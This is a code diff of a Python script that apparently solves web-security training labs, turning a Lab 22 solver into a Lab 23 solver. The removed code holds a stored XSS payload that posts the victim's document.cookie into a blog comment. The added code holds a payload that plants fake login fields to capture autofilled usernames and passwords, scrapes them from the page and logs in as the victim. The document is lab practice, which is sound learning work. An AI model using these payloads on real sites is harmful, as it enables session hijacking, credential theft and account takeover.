@@ -43,6 +43,7 @@ def xss_test(url, use_proxy=False):
         
         blog_url = urljoin(url, 'post?postId=1')
         comment_url = urljoin(url, 'post/comment')
+        login_url = urljoin(url, 'login')
         
         session = requests.Session()
         csrf_token = get_csrf_token(session, blog_url, proxies)
@@ -51,11 +52,9 @@ def xss_test(url, use_proxy=False):
             return False, None
             
         create_comment(url, proxies, csrf_token, session, comment_url)
-        session_data = extract_session_cookie(blog_url, proxies, session)   
-        
-        cookies = {'session': session_data}
-        requests.get(url, cookies=cookies, proxies=proxies, verify=False, timeout=30)
-        
+        username,password = extract_user_credentials(blog_url, proxies, session)
+        csrf_token = get_csrf_token(session, login_url, proxies)
+        login(login_url, username, password, proxies, csrf_token,session)
         return is_solved(url, proxies)
 
     except requests.exceptions.RequestException as e:
@@ -66,28 +65,34 @@ def create_comment(url, proxies, csrf_token, session, post_url):
     print("Creating comment with XSS payload")
     
     base_url = url.rstrip('/')
-    comment_endpoint = f"{base_url}/post/comment"
     
     comment = f'''
-    <script>
-        window.onload = function() {{
-            let csrf_token = document.getElementsByName("csrf")[0].getAttribute("value");
+        <input name="username" id="username">
+        <input type="password" name="password" onchange="credentials()">
 
-            let data = new FormData();
-            data.append("postId", "1");
-            data.append("csrf", csrf_token);
-            data.append("comment", document.cookie);
-            data.append("name", "kurabiye");
-            data.append("email", "asd@asd.com");
-            data.append("website", "https://www.google.com");
+        <script>
+            function credentials() {{
+                let csrf_token = document.getElementsByName("csrf")[0].value;
+                let username = document.getElementsByName("username")[0].value;
+                let password = document.getElementsByName("password")[0].value;
+                
             
-            fetch("{comment_endpoint}", {{
-                method: "POST",
-                mode: "no-cors",
-                body: data
-            }});
-        }}
-    </script>'''
+                let data = new FormData();
+                data.append('postId', '1');
+                data.append('csrf', csrf_token);
+                data.append('comment', "Username:"+username+" Password:"+password);
+                data.append('name', 'kurabiye');
+                data.append('email', 'asd@asd.com');
+                data.append('website', 'https://www.google.com');
+                
+                fetch('{base_url}/post/comment', {{
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: data
+                }});
+            }}
+        </script>
+    '''
 
     payload = {
         "postId": "1",
@@ -108,27 +113,54 @@ def create_comment(url, proxies, csrf_token, session, post_url):
         print(f"The comment could not sent, status code: {response.status_code}")
         return False, response
 
-def extract_session_cookie(blog_url, proxies, session):
+def extract_user_credentials(blog_url, proxies, session):
     response = session.get(blog_url, proxies=proxies, verify=False, timeout=30)
     if response.status_code != 200:
         print("Failed to get post page")
         return None
         
-    print("Extracting session data from the page")
+    print("Extracting user credentials from the page")
     soup = BeautifulSoup(response.text, 'html.parser')
     
-    p_tags = soup.find_all('p')
-    for p_tag in p_tags:
-        if 'secret' in p_tag.text.lower():
-            try:
-                session_data = p_tag.text.split('session=')[1].split(';')[0].strip()
-                print(f"Session Value: {session_data}")
-                return session_data 
-            except IndexError:
-                print("Session information could not be extracted.")
+    p_tags = soup.find_all("p")
+    for p in p_tags:
+        text = p.get_text()
+        if "Username:" in text and "Password:" in text:
+            print("User credentials found:", text)
+            username = text.split("Username:")[1].split("Password:")[0].strip()
+            password = text.split("Password:")[1].strip()
+            print(f"Username: {username}")
+            print(f"Password: {password}")
+            return username,password
+    else:
+        print("No user data found in the page")
     
-    print("No session data found in the page")
     return None
+
+
+def login(url, username, password, proxies, csrf_token,session):
+    print("Logging in with extracted user credentials")
+    
+    login_data = {
+        'csrf': csrf_token,
+        'username': username,
+        'password': password
+    }
+    
+    response = session.post(
+        url,
+        data=login_data,
+        proxies=proxies,
+        verify=False,
+        timeout=30
+    )
+    
+    soup = BeautifulSoup(response.text, 'html.parser')
+    if "Invalid username or password" in soup.get_text().lower():
+        print("Invalid credentials")
+    elif "log out" in soup.get_text().lower():
+        print("Logged in successfully")
+    
 
 def is_solved(url, proxies):
     try:
@@ -140,7 +172,7 @@ def is_solved(url, proxies):
         return False, None
 
 def main():
-    parser = argparse.ArgumentParser(description='XSS Test for Lab 22')
+    parser = argparse.ArgumentParser(description='XSS Test for Lab 23')
     parser.add_argument('-u', '--url', required=True, help='Target URL (Example: https://example.com/)')
     parser.add_argument('-p', '--proxy', action='store_true', help='Use proxy (127.0.0.1:8080)')
     args = parser.parse_args()
